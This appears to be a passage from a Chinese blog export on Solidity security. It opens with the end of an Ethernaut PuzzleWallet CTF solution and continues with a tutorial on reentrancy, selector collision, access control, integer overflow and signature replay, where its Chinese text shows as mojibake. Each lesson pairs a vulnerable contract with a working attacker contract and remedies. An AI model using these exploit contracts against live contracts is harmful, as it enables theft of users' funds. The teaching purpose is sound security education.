msg.value depositCalled = true; &#125; (bool success, ) = address(this).delegatecall(data[i]); require(success, &quot;Error while delegating call&quot;); &#125; &#125;&#125;contract Hack &#123; Proxy wallet; bytes[] data1 = new bytes[](1); bytes[] data2 = new bytes[](2); constructor(address payable _wallet) &#123; wallet = Proxy(_wallet); data1[0] = abi.encodeWithSelector(PuzzleWallet.deposit.selector); data2[0] = abi.encodeWithSelector(PuzzleWallet.deposit.selector); data2[1] = abi.encodeWithSelector(PuzzleWallet.multicall.selector, data1); &#125; function attack() public payable &#123; // å°†proxyä¸­çš„ä½™é¢è½¬èµ° &#123;value:0.001 ether&#125; (bool success2, ) = address(wallet).call&#123;value:0.001 ether&#125;(abi.encodeWithSelector(PuzzleWallet.multicall.selector, data2)); require(success2, &quot;multicall() is fail&quot;); &#125; function repay() public &#123; selfdestruct(payable(msg.sender)); &#125;&#125; å› ä¸ºæ•°æ®åœ¨ä»£ç†åˆçº¦(Proxy)ä¸­åŠ è½½ï¼Œæ‰€ä»¥åœ¨å…¶åˆçº¦ä¸­å†™å…¥balancesæ˜ å°„ï¼Œç”¨äºæ£€æŸ¥æ˜¯å¦å®ç°äº†å­˜ä¸€å–å¤šã€‚ éƒ¨ç½²wallet&#x3D;&#x3D;&gt;å°†walletä¼ å…¥proxyæ„é€ å™¨å¹¶éƒ¨ç½²&#x3D;&#x3D;&gt; å°†proxyä¼ å…¥hackeréƒ¨ç½²,è°ƒç”¨attackå‡½æ•°,å¹¶æ”¯ä»˜0.001ether,å›åˆ°proxyä¸­æŸ¥çœ‹è°ƒç”¨è€…çš„balances,æ˜¾ç¤ºä¸º0.002ether,çŒœæƒ³æ­£ç¡®. 3. è§£é¢˜æ”»å‡»åˆçº¦: 12345678910111213141516171819202122232425262728293031323334353637383940contract Hack &#123; PuzzleProxy proxy; bytes[] data1 = new bytes[](1); bytes[] data2 = new bytes[](2); constructor(address payable _proxy) &#123; proxy = PuzzleProxy(_proxy); data1[0] = abi.encodeWithSelector(PuzzleWallet.deposit.selector); data2[0] = abi.encodeWithSelector(PuzzleWallet.deposit.selector); data2[1] = abi.encodeWithSelector(PuzzleWallet.multicall.selector, data1); &#125; function attack() public payable &#123; // è·å–é’±åŒ…çš„æ‰€æœ‰æƒ proxy.proposeNewAdmin(address(this)); // å°†æœ¬åœ°å€åˆ—å…¥ç™½åå• (bool success1, ) = address(proxy).call(abi.encodeWithSignature(&quot;addToWhitelist(address)&quot;, address(this))); require(success1, &quot;addToWhitelist() is fail&quot;); // éª—å–balanceçš„å€¼ (bool success2, ) = address(proxy).call&#123;value:0.001 ether&#125;(abi.encodeWithSelector(PuzzleWallet.multicall.selector, data2)); require(success2, &quot;multicall() is fail&quot;); // å°†proxyä¸­çš„ä½™é¢è½¬èµ° (bool success4, ) = address(proxy).call(abi.encodeWithSelector(PuzzleWallet.execute.selector, address(this), 0.002 ether, &quot;&quot;)); // è·å–adminèº«ä»½ (bool success3, ) = address(proxy).call(abi.encodeWithSignature(&quot;setMaxBalance(uint256)&quot;, uint(uint160(msg.sender)))); require(success3, &quot;setMaxBalance() is fail&quot;); &#125; function repay() public &#123; selfdestruct(payable(msg.sender)); &#125; receive() external payable &#123;&#125;&#125; æ”»å‡»æ–¹å¼:é€šè¿‡ç”Ÿæˆçš„ç¤ºä¾‹éƒ¨ç½²Hack,ç„¶åè°ƒç”¨attack()å‡½æ•°,å¹¶æ”¯ä»˜0.001ether è§£é¢˜æˆåŠŸ","categories":[{"name":"CTFS","slug":"CTFS","permalink":"https://biyouqiuqiu.com/categories/CTFS/"},{"name":"ethernaut","slug":"CTFS/ethernaut","permalink":"https://biyouqiuqiu.com/categories/CTFS/ethernaut/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://biyouqiuqiu.com/tags/CTF/"},{"name":"Solidity","slug":"Solidity","permalink":"https://biyouqiuqiu.com/tags/Solidity/"}]},{"title":"åŸºç¡€æ¼æ´","slug":"Basic_Knowledge/solidity/åŸºç¡€æ¼æ´","date":"2023-07-28T07:47:10.000Z","updated":"2023-07-28T07:47:10.000Z","comments":true,"path":"2023/07/28/Basic_Knowledge/solidity/åŸºç¡€æ¼æ´/","link":"","permalink":"https://biyouqiuqiu.com/2023/07/28/Basic_Knowledge/solidity/%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E/","excerpt":"","text":"1. é‡å…¥æ”»å‡» ğŸ“Œ é‡å…¥æ”»å‡»æ˜¯æ™ºèƒ½åˆçº¦ä¸­æœ€å¸¸è§çš„ä¸€ç§æ”»å‡»ï¼Œæ”»å‡»è€…é€šè¿‡åˆçº¦æ¼æ´ï¼ˆä¾‹å¦‚fallbackå‡½æ•°ï¼‰å¾ªç¯è°ƒç”¨åˆçº¦ï¼Œå°†åˆçº¦ä¸­èµ„äº§è½¬èµ°æˆ–é“¸é€ å¤§é‡ä»£å¸ã€‚ 1.1 å¤ç°Bank.sol 123456789101112131415161718192021222324contract Bank &#123; mapping (address =&gt; uint256) public balanceOf; // è®°å½•è´¦æˆ·ä½™é¢ constructor() payable &#123;&#125; // å­˜æ¬¾ function deposit() external payable &#123; balanceOf[msg.sender] += msg.value; &#125; // å–æ¬¾ï¼Œé»˜è®¤ä¸€æ¬¡æ€§å–å®Œ function withdraw() external &#123; uint256 balance = balanceOf[msg.sender]; require(balance &gt; 0, &quot;balance is null&quot;); (bool success, ) = msg.sender.call&#123;value: balance&#125;(&quot;&quot;); require(success, &quot;withdraw is fail&quot;); balanceOf[msg.sender] = 0; &#125; function getBalance() external view returns (uint256) &#123; return address(this).balance; &#125;&#125; Hacker.sol 1234567891011121314151617181920212223contract Hacker &#123; Bank bank; constructor(address _bank) &#123; bank = Bank(_bank); &#125; function attack() external payable &#123; bank.deposit&#123;value: msg.value&#125;(); bank.withdraw(); &#125; receive() external payable &#123; if (bank.getBalance() &gt; 0) &#123; bank.withdraw(); &#125; &#125; function getBalance() external view returns (uint256) &#123; return address(this).balance; &#125;&#125; åˆ†æ å½“ Hackerè°ƒç”¨ attackå‡½æ•°æ—¶ï¼Œå…ˆæ‰§è¡Œå­˜æ¬¾æ“ä½œï¼Œå¾ˆæ­£å¸¸ï¼Œä½†æ˜¯å½“æ‰§è¡Œåˆ°å–æ¬¾æ“ä½œæ—¶ï¼Œ(bool success, ) = msg.sender.call&#123;value: balance&#125;(&quot;&quot;)è¿™è¡Œä»£ç æ—¨åœ¨ç»™è°ƒç”¨è€…è½¬è´¦ï¼Œè°ƒç”¨è€…ä¸­çš„å›é€€å‡½æ•°ä¼šè¢«é»˜è®¤æ‰§è¡Œï¼Œä½†æ˜¯åœ¨ Hackeråˆçº¦ä¸­ï¼Œreceiveå›é€€å‡½æ•°ä¸­åˆå»è°ƒç”¨äº†å–é’±æ“ä½œï¼Œå–é’±æ“ä½œçš„é€»è¾‘æ— æ³•ç»§ç»­å¾€ä¸‹è¿›è¡Œï¼Œè°ƒç”¨è€…çš„è´¦æˆ·ä½™é¢æ— æ³•å¾—åˆ°æ›´æ–°ï¼Œä»è€Œä½¿å¾—é“¶è¡Œè¯¯ä»¥ä¸º require(balance &gt; 0, &quot;balance is null&quot;);æ˜¯æ­£ç¡®çš„ï¼Œæ‰€ä»¥ä¸€ç›´æ‰§è¡Œ(bool success, ) = msg.sender.call&#123;value: balance&#125;(&quot;&quot;)ï¼Œç›´åˆ°é“¶è¡Œä¸­çš„ä½™é¢è¢«ç›—å–ç©ºä¸ºæ­¢ã€‚ æ‰§è¡Œé€»è¾‘ éƒ¨ç½²Bankåˆçº¦ï¼Œè½¬å…¥20 ETHã€‚ åˆ‡æ¢åˆ°æ”»å‡»è€…é’±åŒ…ï¼Œéƒ¨ç½²Hackeråˆçº¦ã€‚ è°ƒç”¨Hackeråˆçº¦çš„attack()å‡½æ•°å‘åŠ¨æ”»å‡»ï¼Œè°ƒç”¨æ—¶éœ€è½¬è´¦1 ETHã€‚ è°ƒç”¨Bankåˆçº¦çš„getBalance()å‡½æ•°ï¼Œå‘ç°ä½™é¢å·²è¢«æç©ºã€‚ è°ƒç”¨Hackeråˆçº¦çš„getBalance()å‡½æ•°ï¼Œå¯ä»¥çœ‹åˆ°ä½™é¢å˜ä¸º21 ETHï¼Œé‡å…¥æ”»å‡»æˆåŠŸã€‚ 1.2 é¢„é˜² ğŸ“Œ ç›®å‰ä¸»è¦æœ‰ä¸¤ç§åŠæ³•æ¥é¢„é˜²å¯èƒ½çš„é‡å…¥æ”»å‡»æ¼æ´ï¼š æ£€æŸ¥-å½±å“-äº¤äº’æ¨¡å¼ï¼ˆchecks-effect-interactionï¼‰å’Œé‡å…¥é” æ£€æŸ¥-å½±å“-äº¤äº’æ¨¡å¼ æ£€æŸ¥-å½±å“-äº¤äº’æ¨¡å¼å¼ºè°ƒç¼–å†™å‡½æ•°æ—¶ï¼Œè¦å…ˆæ£€æŸ¥çŠ¶æ€å˜é‡æ˜¯å¦ç¬¦åˆè¦æ±‚ï¼Œç´§æ¥ç€æ›´æ–°çŠ¶æ€å˜é‡ï¼ˆä¾‹å¦‚ä½™é¢ï¼‰ï¼Œæœ€åå†å’Œåˆ«çš„åˆçº¦äº¤äº’ã€‚å¦‚æœæˆ‘ä»¬å°†Bankåˆçº¦withdraw()å‡½æ•°ä¸­çš„æ›´æ–°ä½™é¢æå‰åˆ°è½¬è´¦ETHä¹‹å‰ï¼Œå°±å¯ä»¥ä¿®å¤æ¼æ´ï¼š 123456789function withdraw() external &#123; uint256 balance = balanceOf[msg.sender]; require(balance &gt; 0, &quot;Insufficient balance&quot;); // æ£€æŸ¥-æ•ˆæœ-äº¤äº’æ¨¡å¼ï¼ˆchecks-effect-interactionï¼‰ï¼šå…ˆæ›´æ–°ä½™é¢å˜åŒ–ï¼Œå†å‘é€ETH // é‡å…¥æ”»å‡»çš„æ—¶å€™ï¼ŒbalanceOf[msg.sender]å·²ç»è¢«æ›´æ–°ä¸º0äº†ï¼Œä¸èƒ½é€šè¿‡ä¸Šé¢çš„æ£€æŸ¥ã€‚ balanceOf[msg.sender] = 0; (bool success, ) = msg.sender.call&#123;value: balance&#125;(&quot;&quot;); require(success, &quot;Failed to send Ether&quot;);&#125; é‡å…¥é” é‡å…¥é”æ˜¯ä¸€ç§é˜²æ­¢é‡å…¥å‡½æ•°çš„ä¿®é¥°å™¨ï¼ˆmodifierï¼‰ï¼Œå®ƒåŒ…å«ä¸€ä¸ªé»˜è®¤ä¸º0çš„çŠ¶æ€å˜é‡_statusã€‚è¢«nonReentranté‡å…¥é”ä¿®é¥°çš„å‡½æ•°ï¼Œåœ¨ç¬¬ä¸€æ¬¡è°ƒç”¨æ—¶ä¼šæ£€æŸ¥_statusæ˜¯å¦ä¸º0ï¼Œç´§æ¥ç€å°†_statusçš„å€¼æ”¹ä¸º1ï¼Œè°ƒç”¨ç»“æŸåæ‰ä¼šå†æ”¹ä¸º0ã€‚è¿™æ ·ï¼Œå½“æ”»å‡»åˆçº¦åœ¨è°ƒç”¨ç»“æŸå‰ç¬¬äºŒæ¬¡çš„è°ƒç”¨å°±ä¼šæŠ¥é”™ï¼Œé‡å…¥æ”»å‡»å¤±è´¥ã€‚ 123456789101112uint256 private _status; // é‡å…¥é”// é‡å…¥é”modifier nonReentrant() &#123; // åœ¨ç¬¬ä¸€æ¬¡è°ƒç”¨ nonReentrant æ—¶ï¼Œ_status å°†æ˜¯ 0 require(_status == 0, &quot;ReentrancyGuard: reentrant call&quot;); // åœ¨æ­¤ä¹‹åå¯¹ nonReentrant çš„ä»»ä½•è°ƒç”¨éƒ½å°†å¤±è´¥ _status = 1; _; // è°ƒç”¨ç»“æŸï¼Œå°† _status æ¢å¤ä¸º0 _status = 0;&#125; åªéœ€è¦ç”¨nonReentranté‡å…¥é”ä¿®é¥°withdraw()å‡½æ•°ï¼Œå°±å¯ä»¥é¢„é˜²é‡å…¥æ”»å‡»äº†ã€‚ 2. é€‰æ‹©å™¨ç¢°æ’ ğŸ“Œä»¥å¤ªåŠæ™ºèƒ½åˆçº¦ä¸­ï¼Œå‡½æ•°é€‰æ‹©å™¨æ˜¯å‡½æ•°ç­¾å &quot;&lt;function name&gt;(&lt;function input types&gt;)&quot; çš„å“ˆå¸Œå€¼çš„å‰4ä¸ªå­—èŠ‚ï¼ˆ8ä½åå…­è¿›åˆ¶ï¼‰ã€‚å½“ç”¨æˆ·è°ƒç”¨åˆçº¦çš„å‡½æ•°æ—¶ï¼Œcalldataçš„å‰4å­—èŠ‚å°±æ˜¯ç›®æ ‡å‡½æ•°çš„é€‰æ‹©å™¨ï¼Œå†³å®šäº†è°ƒç”¨å“ªä¸ªå‡½æ•°ã€‚ 2.1 å¤ç°ä¸‹é¢æˆ‘ä»¬æ¥çœ‹ä¸€ä¸‹æœ‰æ¼æ´çš„åˆçº¦ä¾‹å­ã€‚SelectorClashåˆçº¦æœ‰1ä¸ªçŠ¶æ€å˜é‡ solvedï¼Œåˆå§‹åŒ–ä¸ºfalseï¼Œæ”»å‡»è€…éœ€è¦å°†å®ƒæ”¹ä¸ºtrueã€‚åˆçº¦ä¸»è¦æœ‰2ä¸ªå‡½æ•°ï¼Œå‡½æ•°åæ²¿ç”¨è‡ª Poly Network æ¼æ´åˆçº¦ã€‚ putCurEpochConPubKeyBytes() ï¼šæ”»å‡»è€…è°ƒç”¨è¿™ä¸ªå‡½æ•°åï¼Œå°±å¯ä»¥å°†solvedæ”¹ä¸ºtrueï¼Œå®Œæˆæ”»å‡»ã€‚ä½†æ˜¯è¿™ä¸ªå‡½æ•°æ£€æŸ¥msg.sender == address(this)ï¼Œå› æ­¤è°ƒç”¨è€…å¿…é¡»ä¸ºåˆçº¦æœ¬èº«ï¼Œæˆ‘ä»¬éœ€è¦çœ‹ä¸‹å…¶ä»–å‡½æ•°ã€‚ executeCrossChainTx() ï¼šé€šè¿‡å®ƒå¯ä»¥è°ƒç”¨åˆçº¦å†…çš„å‡½æ•°ï¼Œä½†æ˜¯å‡½æ•°å‚æ•°çš„ç±»å‹å’Œç›®æ ‡å‡½æ•°ä¸å¤ªä¸€æ ·ï¼šç›®æ ‡å‡½æ•°çš„å‚æ•°ä¸º(bytes)ï¼Œè€Œè¿™é‡Œè°ƒç”¨çš„å‡½æ•°å‚æ•°ä¸º(bytes,bytes,uint64)ã€‚ 1234567891011121314contract SelectorClash &#123; bool public solved; // æ”»å‡»æ˜¯å¦æˆåŠŸ // æ”»å‡»è€…éœ€è¦è°ƒç”¨è¿™ä¸ªå‡½æ•°ï¼Œä½†æ˜¯è°ƒç”¨è€… msg.sender å¿…é¡»æ˜¯æœ¬åˆçº¦ã€‚ function putCurEpochConPubKeyBytes(bytes memory _bytes) public &#123; require(msg.sender == address(this), &quot;Not Owner&quot;); solved = true; &#125; // æœ‰æ¼æ´ï¼Œæ”»å‡»è€…å¯ä»¥é€šè¿‡æ”¹å˜ _method å˜é‡ç¢°æ’å‡½æ•°é€‰æ‹©å™¨ï¼Œè°ƒç”¨ç›®æ ‡å‡½æ•°å¹¶å®Œæˆæ”»å‡»ã€‚ function executeCrossChainTx(bytes memory _method, bytes memory _bytes, bytes memory _bytes1, uint64 _num) public returns(bool success)&#123; (success, ) = address(this).call(abi.encodePacked(bytes4(keccak256(abi.encodePacked(_method, &quot;(bytes,bytes,uint64)&quot;))), abi.encode(_bytes, _bytes1, _num))); &#125;&#125; æ”»å‡»æ–¹æ³• åˆ©ç”¨executeCrossChainTx()å‡½æ•°è°ƒç”¨åˆçº¦ä¸­çš„putCurEpochConPubKeyBytes()ï¼Œç›®æ ‡å‡½æ•°çš„é€‰æ‹©å™¨ä¸ºï¼š0x41973cd9ã€‚è§‚å¯Ÿåˆ°executeCrossChainTx()ä¸­æ˜¯åˆ©ç”¨_methodå‚æ•°å’Œ&quot;(bytes,bytes,uint64)&quot;ä½œä¸ºå‡½æ•°ç­¾åè®¡ç®—çš„é€‰æ‹©å™¨ã€‚å› æ­¤ï¼Œæˆ‘ä»¬åªéœ€è¦é€‰æ‹©æ°å½“çš„_methodï¼Œè®©è¿™é‡Œç®—å‡ºçš„é€‰æ‹©å™¨ç­‰äº0x41973cd9ï¼Œé€šè¿‡é€‰æ‹©å™¨ç¢°æ’è°ƒç”¨ç›®æ ‡å‡½æ•°ã€‚ Poly Networké»‘å®¢äº‹ä»¶ä¸­ï¼Œé»‘å®¢ç¢°æ’å‡ºçš„_methodä¸º f1121318093ï¼Œå³f1121318093(bytes,bytes,uint64)çš„å“ˆå¸Œå‰4ä½ä¹Ÿæ˜¯0x41973cd9ï¼Œå¯ä»¥æˆåŠŸçš„è°ƒç”¨å‡½æ•°ã€‚æ¥ä¸‹æ¥æˆ‘ä»¬è¦åšçš„å°±æ˜¯å°†f1121318093è½¬æ¢ä¸ºbytesç±»å‹ï¼š0x6631313231333138303933ï¼Œç„¶åä½œä¸ºå‚æ•°è¾“å…¥åˆ°executeCrossChainTx()ä¸­ã€‚executeCrossChainTx()å‡½æ•°å¦3ä¸ªå‚æ•°ä¸é‡è¦ï¼Œå¡« 0x, 0x, 0 å°±å¯ä»¥ã€‚ å°†f1121318093è½¬ä¸ºbytesç±»å‹çš„ åœ¨çº¿ç¼–è¯‘å™¨ è¿™ä¸¤ä¸ªç½‘ç«™æ¥æŸ¥åŒä¸€ä¸ªé€‰æ‹©å™¨å¯¹åº”çš„ä¸åŒå‡½æ•°ï¼š https://www.4byte.directory/ https://sig.eth.samczsun.com/ Remixå¤ç° éƒ¨ç½²SelectorClashåˆçº¦ï¼Œå¹¶è°ƒç”¨putCurEpochConPubKeyBytesä¼šæŠ¥é”™ å°† f1121318093è½¬ä¸ºbytesç±»å‹ä¹‹åï¼Œè°ƒç”¨ executeCrossChainTxå‡½æ•° solvedçš„å€¼è¢«æˆåŠŸä¿®æ”¹ä¸ºtrue 3. è®¿é—®æ§åˆ¶æŸäº›å¯¹æƒé™æœ‰è¦æ±‚çš„æ–¹æ³•çš„ä¿®é¥°ç¬¦é€»è¾‘é”™è¯¯é€ æˆåˆçº¦ä¸­çš„æŸäº›ç§æœ‰å‡½æ•°å¯ä»¥è¢«éæ³•è°ƒç”¨ å¸¸å‡ºç°çš„åœ°æ–¹ function çš„ä¿®é¥°å™¨ modifierä¸Šï¼› è®¿é—®æ§åˆ¶æƒé™ private public internal external è°ƒç”¨æ–¹æ³• call delegatecall 3.1 å¤ç°æ¼æ´ç¤ºä¾‹ä¸€ 1234567891011121314151617181920212223242526272829303132333435pragma solidity ^0.4.24;contract AccessGame&#123; uint totalSupply=0; address public owner; mapping (address =&gt; uint256) public balances; event SendBouns(address _who, uint bouns); modifier onlyOwner &#123; if (msg.sender != owner) revert(); _; &#125; constructor() public &#123; initOwner(msg.sender); //initOwner()åˆå§‹åŒ–ç®¡ç†å‘˜æƒé™ &#125; function initOwner(address _owner) public&#123; owner=_owner; &#125; function SendBonus(address lucky, uint bouns) public onlyOwner returns (uint)&#123; require(balances[lucky]&lt;1000); require(bouns&lt;200); balances[lucky]+=bouns; totalSupply+=bouns; emit SendBouns(lucky, bouns); return balances[lucky]; &#125;&#125; onlyOwner ä¿®é¥°å™¨è¦æ±‚è°ƒç”¨è€…å¿…é¡»æ˜¯ ownerï¼Œè€Œowneråœ¨åˆå§‹åŒ–çš„æ—¶å€™å°±å·²ç»å£°æ˜äº†ï¼Œä½†æ˜¯ function initOwner(address _owner) publicï¼Œçš„è®¿é—®æƒé™ä¸º publicï¼Œä»»ä½•äººéƒ½å¯ä»¥è°ƒç”¨ï¼Œåªè¦å°†ownerè®¾ç½®ä¸ºhackerå°±å¯ä»¥æˆåŠŸè°ƒç”¨SendBonuså‡½æ•°äº†ã€‚ æ¼æ´ç¤ºä¾‹äºŒ callçš„æ»¥ç”¨ 1234567891011121314151617181920212223242526272829// SPDX-License-Identifier: MITpragma solidity ^0.8.4;contract Target &#123; bool public issloved; function slove() external &#123; require(msg.sender == address(this)); issloved = true; &#125; function call(bytes memory data) external &#123; address(this).call(data); &#125;&#125;contract Hacker &#123; address target; constructor(address _target) &#123; target = _target; &#125; function attack() external &#123; target.call(abi.encodeWithSelector(Target.call.selector, abi.encodeWithSignature(&quot;slove()&quot;))); &#125;&#125; ä½çº§è°ƒç”¨callä¼šæ”¹å˜msg.senderçš„å€¼ã€‚ 4. æ•´æ•°æº¢å‡ºä»¥å¤ªåŠè™šæ‹Ÿæœº (EVM) ä¸ºæ•´æ•°æŒ‡å®šå›ºå®šå¤§å°çš„æ•°æ®ç±»å‹ã€‚è¿™æ„å‘³ç€ä¸€ä¸ªæ•´æ•°å˜é‡ï¼Œåªèƒ½è¡¨ç¤ºä¸€å®šèŒƒå›´çš„æ•°å­—ã€‚ä¾‹å¦‚uint8 åªèƒ½å­˜å‚¨ [0,255] èŒƒå›´å†…çš„æ•°å­—ã€‚å°è¯•å°† 256 å­˜å‚¨åˆ° uint8 å°†å¯¼è‡´ 0ã€‚å¦‚æœä¸å°å¿ƒï¼Œç”¨æˆ·è¾“å…¥æœªè¢«æ£€æŸ¥ï¼Œå¹¶ä¸”æ‰§è¡Œçš„è®¡ç®—ç»“æœè¶…å‡ºäº†å­˜å‚¨å®ƒä»¬çš„æ•°æ®ç±»å‹çš„èŒƒå›´ï¼Œé‚£ä¹ˆ Solidity ä¸­çš„å˜é‡å¯èƒ½ä¼šè¢«åˆ©ç”¨ã€‚æ•´æ•°æº¢å‡ºæ¼æ´æœ‰ä¸Šæº¢å’Œä¸‹æº¢ä¸¤ç§æƒ…å½¢ã€‚solidity 0.8.0 ç‰ˆæœ¬ä¹‹ä¹‹å‰ã€‚ ä¸Šæº¢ æ•´æ•°ä¸Šæº¢æ˜¯æŒ‡æ•°å­—çš„å¢é‡è¶…è¿‡å…¶èƒ½å­˜å‚¨çš„æœ€å¤§å€¼ã€‚å¦‚å¯¹äº uint256 ç±»å‹çš„å˜é‡ï¼ŒSolidity å¯ä»¥å¤„ç†å¤šè¾¾ 256 ä¸ªæ¯”ç‰¹ä½çš„æ•°å€¼ (æœ€å¤§å€¼æ˜¯ 2256 - 1)ï¼Œæ‰€ä»¥å¦‚æœåœ¨æœ€å¤§æ•°ä¸Šå¢åŠ  1 ä¼šå¯¼è‡´ 0ã€‚å¦‚ä¸‹æ‰€ç¤ºï¼š 12345 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF+ 0x000000000000000000000000000000000001------------------------------------------= 0x000000000000000000000000000000000000 ä¸‹æº¢ åŒæ ·ï¼Œåœ¨ç›¸åçš„æƒ…å†µä¸‹ï¼Œå½“æ•°å­—æ˜¯æ— ç¬¦å·çš„æ—¶ï¼Œé€’å‡å°†ä¼šä¸‹æº¢è¯¥æ•°å­—ï¼Œä»è€Œå¾—åˆ°å¯èƒ½çš„æœ€å¤§å€¼ã€‚å¦‚ä¸‹æ‰€ç¤ºï¼š 12345 0x000000000000000000000000000000000000- 0x000000000000000000000000000000000001------------------------------------------= 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF 4.1 å¤ç°ç¤ºä¾‹ä¸€ 1234567891011121314151617181920212223pragma solidity ^0.4.18;contract TimeLock &#123; mapping(address =&gt; uint) public balances; mapping(address =&gt; uint) public lockTime; function deposit() public payable &#123; balances[msg.sender] += msg.value; lockTime[msg.sender] = now + 1 weeks; &#125; function increaseLockTime(uint _secondsToIncrease) public &#123; lockTime[msg.sender] += _secondsToIncrease; &#125; function withdraw() public &#123; require(balances[msg.sender] &gt; 0); require(now &gt; lockTime[msg.sender]); uint transferValue = balances[msg.sender]; balances[msg.sender] = 0; msg.sender.transfer(transferValue); &#125;&#125; å…¶ä¸­çš„increaseLockTimeå‡½æ•°ä¸­ï¼Œç”±äºå¯ä»¥è‡ªå·±è¾“å…¥ä¸€ä¸ªè‡ªç”±çš„æ—¶é—´æˆ³å¢é‡ï¼Œæ‰€ä»¥ä¼šå¸¦æ¥æ•´æ•°æº¢å‡ºçš„å±é™©ã€‚è¯•æƒ³ä¸€ä¸‹ï¼Œå¦‚æœè¾“å…¥çš„_secondsToIncreaseå’ŒåŸæœ‰çš„lockTime[msg.sender]ç›¸åŠ ï¼Œç”±äºæº¢å‡ºï¼Œæœ€åä½¿å¾—lockTime[msg.sender]çš„å€¼æˆä¸ºä¸€ä¸ªå¾ˆå°çš„å€¼ï¼Œè¿™æ ·åœ¨withdrawå‡½æ•°ä¸­ï¼Œå°±å¯ä»¥é¡ºåˆ©é€šè¿‡ã€‚ æ”»å‡»åˆçº¦ 12345678contract Hacker &#123; function attack() external view returns (uint256 result) &#123; uint zero = 0; uint hacker_time = zero - 1; result = hacker_time - now; &#125;&#125; ç¤ºä¾‹äºŒ 1234567891011121314151617181920212223// SPDX-License-Identifier: MITpragma solidity ^0.8.4;contract Token &#123; mapping(address =&gt; uint) balances; uint public totalSupply; constructor(uint _initialSupply) &#123; balances[msg.sender] = totalSupply = _initialSupply; &#125; function transfer(address _to, uint _value) public returns (bool) &#123; unchecked&#123; require(balances[msg.sender] - _value &gt;= 0); balances[msg.sender] -= _value; balances[_to] += _value; &#125; return true; &#125; function balanceOf(address _owner) public view returns (uint balance) &#123; return balances[_owner]; &#125;&#125; ğŸ“Œåˆ†æï¼š ç”±äºsolidity 0.8.0 ç‰ˆæœ¬ä¹‹åä¼šè‡ªåŠ¨æ£€æŸ¥æ•´å‹æº¢å‡ºé”™è¯¯ï¼Œæº¢å‡ºæ—¶ä¼šæŠ¥é”™ã€‚å¦‚æœæˆ‘ä»¬è¦é‡ç°è¿™ç§æ¼æ´ï¼Œéœ€è¦ä½¿ç”¨ unchecked å…³é”®å­—ï¼Œåœ¨ä»£ç å—ä¸­ä¸´æ—¶å…³æ‰æº¢å‡ºæ£€æŸ¥ã€‚ æ¼æ´æ‰€åœ¨ï¼š require(balances[msg.sender] - _value &gt;= 0);ä¸ç®¡è½¬è´¦çš„é‡‘é¢æ˜¯å¤šå°‘ï¼Œè¯¥æ¡ä»¶æ°¸è¿œéƒ½ä¼šé€šè¿‡ï¼Œå½“balances[msg.sender] &gt; _valueæ—¶ï¼Œæ­¤æ—¶msg.senderçš„ä½™é¢å‘ç”Ÿä¸‹æº¢ï¼Œä½™é¢å°†å¤šåˆ°ç¦»è°±ã€‚ 4.2 é¢„é˜²æˆ‘ä»¬å»ºè®®ä½¿ç”¨ OpenZeppelin çš„ SafeMath åº“æ¥è§£å†³æ•´æ•°æº¢å‡ºé—®é¢˜ã€‚OppenZepplin åœ¨æ„å»ºå’Œå®¡è®¡å®‰å…¨åº“æ–¹é¢åšå¾—å¾ˆå¥½ï¼Œç‰¹åˆ«æ˜¯ä»–ä»¬çš„å®‰å…¨æ•°å­¦åº“æ˜¯ä¸€ä¸ªç”¨æ¥é¿å…æº¢å‡ºæ¼æ´çš„å‚è€ƒæˆ–åº“ï¼Œä¸”å·²ç§°ä¸ºä¸€ä¸ªæ ‡å‡†ã€‚ ä½¿ç”¨æ–¹æ³•ï¼šusing SafeMath for uint; 5. ç­¾åé‡æ”¾ ğŸ“Œ æ•°å­—ç­¾åä¸€èˆ¬æœ‰ä¸¤ç§å¸¸è§çš„é‡æ”¾æ”»å‡» æ™®é€šé‡æ”¾ï¼šå°†æœ¬è¯¥ä½¿ç”¨ä¸€æ¬¡çš„ç­¾åå¤šæ¬¡ä½¿ç”¨ã€‚ è·¨é“¾é‡æ”¾ï¼šå°†æœ¬è¯¥åœ¨ä¸€æ¡é“¾ä¸Šä½¿ç”¨çš„ç­¾åï¼Œåœ¨å¦ä¸€æ¡é“¾ä¸Šé‡å¤ä½¿ç”¨ã€‚ 5.1 å¤ç°ä¸‹é¢çš„SigReplayåˆçº¦æ˜¯ä¸€ä¸ªERC20ä»£å¸åˆçº¦ï¼Œå®ƒçš„é“¸é€ å‡½æ•°æœ‰ç­¾åé‡æ”¾æ¼æ´ã€‚å®ƒä½¿ç”¨é“¾ä¸‹ç­¾åè®©ç™½åå•åœ°å€ to é“¸é€ ç›¸åº”æ•°é‡ amount çš„ä»£å¸ã€‚åˆçº¦ä¸­ä¿å­˜äº† signer åœ°å€ï¼Œæ¥éªŒè¯ç­¾åæ˜¯å¦æœ‰æ•ˆã€‚ 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556// SPDX-License-Identifier: MITpragma solidity ^0.8.4;import &quot;@openzeppelin/contracts/token/ERC20/ERC20.sol&quot;;import &quot;@openzeppelin/contracts/access/Ownable.sol&quot;;import &quot;@openzeppelin/contracts/utils/cryptography/ECDSA.sol&quot;;// æƒé™ç®¡ç†é”™è¯¯ä¾‹å­contract SigReplay is ERC20 &#123; address public signer; // æ„é€ å‡½æ•°ï¼šåˆå§‹åŒ–ä»£å¸åç§°å’Œä»£å· constructor() ERC20(&quot;SigReplay&quot;, &quot;Replay&quot;) &#123; signer = msg.sender; &#125; /** * æœ‰ç­¾åé‡æ”¾æ¼æ´çš„é“¸é€ å‡½æ•° * to: 0x5B38Da6a701c568545dCfcB03FcB875f56beddC4 * amount: 1000 * ç­¾åï¼š 0x5a4f1ad4d8bd6b5582e658087633230d9810a0b7b8afa791e3f94cc38947f6cb1069519caf5bba7b975df29cbfdb4ada355027589a989435bf88e825841452f61b */ function badMint(address to, uint amount, bytes memory signature) public &#123; bytes32 _msgHash = toEthSignedMessageHash(getMessageHash(to, amount)); require(verify(_msgHash, signature), &quot;Invalid Signer!&quot;); _mint(to, amount); &#125; /** * å°†toåœ°å€ï¼ˆaddressç±»å‹ï¼‰å’Œamountï¼ˆuint256ç±»å‹ï¼‰æ‹¼æˆæ¶ˆæ¯msgHash * to: 0x5B38Da6a701c568545dCfcB03FcB875f56beddC4 * amount: 1000 * å¯¹åº”çš„æ¶ˆæ¯msgHash: 